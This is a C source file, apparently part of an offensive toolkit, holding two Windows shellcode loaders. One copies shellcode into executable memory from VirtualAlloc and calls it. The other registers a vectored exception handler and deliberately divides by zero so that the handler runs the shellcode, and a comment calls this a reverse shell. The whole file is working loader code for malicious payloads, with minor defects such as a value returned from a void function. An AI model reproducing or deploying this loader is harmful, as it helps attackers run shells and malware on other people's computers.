#include <windows.h>

void loadVirtualAlloc(char* shellcode, size_t size) {
	void* execMem = VirtualAlloc(
		NULL,
		size,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	if (!execMem) {
		printf("[X] VirtualAlloc error (huh ?)\n");
		free(shellcode);
		return 1;
	}

	memcpy(execMem, shellcode, size);

	printf("[+] Running shellcode...\n");
	((void(*)())execMem)(); // casting execMem to a void function

	// Cleaning
	VirtualFree(execMem, 0, MEM_RELEASE);
	free(shellcode);
}

// Get vectored
// Need global var :(
unsigned char* g_shellcode = NULL;
size_t g_shellcodeSize = 0;

LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS pExceptionInfo) {
	// Check if it's a divide by zero exception
	if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO) {
		printf("[+] Exception caught, running shellcode ...\n");

		// Just in case
		if (g_shellcode == NULL || g_shellcodeSize == 0) {
			printf("[X] Shellcode error :(\n");
			return EXCEPTION_CONTINUE_SEARCH;  // Keep going to not make everything crash if shellcode is invalid
		}

		// VirtualAlloc shellcode as usual
		void* execMem = VirtualAlloc(NULL, g_shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (execMem == NULL) {
			printf("[X] VirtualAlloc error (huh ?)\n");
			return EXCEPTION_CONTINUE_SEARCH;  // Keep going to not make everything crash if shellcode is invalid
		}

		memcpy(execMem, g_shellcode, g_shellcodeSize);

		((void(*)())execMem)();  // Telephone meeeee

		VirtualFree(execMem, 0, MEM_RELEASE);

		return EXCEPTION_EXECUTE_HANDLER;  // Not make an infinite loop
	}

	// Not my fault
	return EXCEPTION_CONTINUE_SEARCH;
}

void loadVectoredException(char* shellcode, size_t size) {
	// Global because Exception Handler can't be defined here and needs access to shellcode
	g_shellcode = shellcode;
	g_shellcodeSize = size;

	// Add an exception vector, 1 is to make it the first of the exception handlers so it's executed before the others
	if (AddVectoredExceptionHandler(1, ExceptionHandler) == NULL) {
		printf("[X] Couldn't add an Exception Handler sadly\n");
		return;
	}

	printf("[*] Dividing by 0\n");

	// Fun part, 2/0 = reverse shell
	int a = 2;
	int b = 0;
	int result = a / b;

	printf("I wont be executed :(\n");
}